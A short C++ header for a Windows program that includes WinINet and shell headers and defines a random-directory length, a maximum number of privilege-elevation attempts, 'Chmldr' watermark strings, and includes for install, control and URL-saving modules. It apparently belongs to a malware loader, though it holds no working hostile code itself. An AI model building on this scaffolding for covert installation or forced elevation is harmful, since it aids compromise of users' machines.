#pragma once

#include <windows.h>
#include <wininet.h>
#include <shlobj.h>

#pragma comment(lib, "wininet.lib")

static CONST DWORD RandomDirectoryLen = 6;
static CONST DWORD MAX_ELEVATE_TRIES = 3; 


#define WATERMARK "Chmldr"
#define ENDWATERMARK "hCmldr"

namespace CONFIG
{
	extern CONST WCHAR ProjectName[]; 
}
#include "mydbg.h"
#include "memory.h"
#include "utils.h"
#include "Install.h"
#include "Control.h"
#include "urlsaver.h"

#pragma warning(disable : 4996)